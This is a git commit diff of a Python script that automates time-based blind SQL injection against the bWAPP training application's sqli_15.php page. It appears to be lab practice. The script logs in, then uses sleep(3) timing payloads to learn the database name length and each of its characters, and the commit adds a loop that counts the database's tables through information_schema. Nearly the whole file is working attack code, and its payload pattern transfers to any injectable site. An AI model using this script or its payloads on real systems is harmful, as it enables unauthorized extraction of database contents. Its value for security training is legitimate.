4382bdcc190e230cace7a3df41fa5e96d4b4d382
aideyisu <740531307@qq.com>
2020-07-28 01:31:47 +0800

    new:更新风格且添加时间盲注入数据表长度

--- tools/SqlInjectionTime.py
+++ tools/SqlInjectionTime.py
@@ -4,7 +4,7 @@ bwapp sqli 时间盲注 将ip改为自己ip即可
 import requests
 import time
 
-ip_port = '192.168.43.94:80'
+ip_port = '127.0.0.1:80'
 data = {
     'login' : 'aideyisu',
     'password' : 'aideyisu',
@@ -17,31 +17,42 @@ session = requests.session()
 resp = session.post(url_login, data)
 num = 0
 
+base_url_start = f"http://{ip_port}/sqli_15.php?title=World War Z' and"
+base_url_end = f"and sleep(3) -- &action=search"
+
 # 获取数据库长度名称`
 for i in range(1, 21) :
-    url = "http://%s/sqli_15.php?title=World War Z' and length(database())=%d and sleep(3) -- &action=search"%(ip_port, i)
+    url = f"{base_url_start} length(database())={i} {base_url_end}"
     start_time = time.time()
     resp =session.get(url)
     end_time = time.time()
     if  end_time - start_time > 1 :
-        print(f'length of database name is {i} \n{start_time} \n{end_time}\n')
+        print(f'length of database name is {i} \n')
         num = i
         break
 
-result = []
+dbname= ''
 # 获取数据库名字    
 for j in range(1, num + 1) :
     for k in range(33, 128) :
-        url = "http://%s/sqli_15.php?title=World War Z' and ascii(substr(database(),%d,1))=%d and sleep(3) -- &action=search"%(ip_port, j, k)
+        url = f"{base_url_start} ascii(substr(database(),{j},1))={k} {base_url_end}"
         start_time = time.time()
         resp =session.get(url)
         end_time = time.time()
         if  end_time - start_time > 1 :
             print(chr(k))
-            result.append(chr(k))
+            dbname += chr(k)
             break
+print('database name ' + dbname)
 
-print(result)
-
-
+# 获取表长度
+for i in range(1, 21) :
+    url = f"{base_url_start} if((select count(*) from information_schema.tables where table_schema = '{dbname}')={i},1,0) {base_url_end}"
+    start_time = time.time()
+    resp =session.get(url)
+    end_time = time.time()
+    if  end_time - start_time > 1 :
+        print(f'length of {dbname} name is {i} \n')
+        num = i
+        break
 
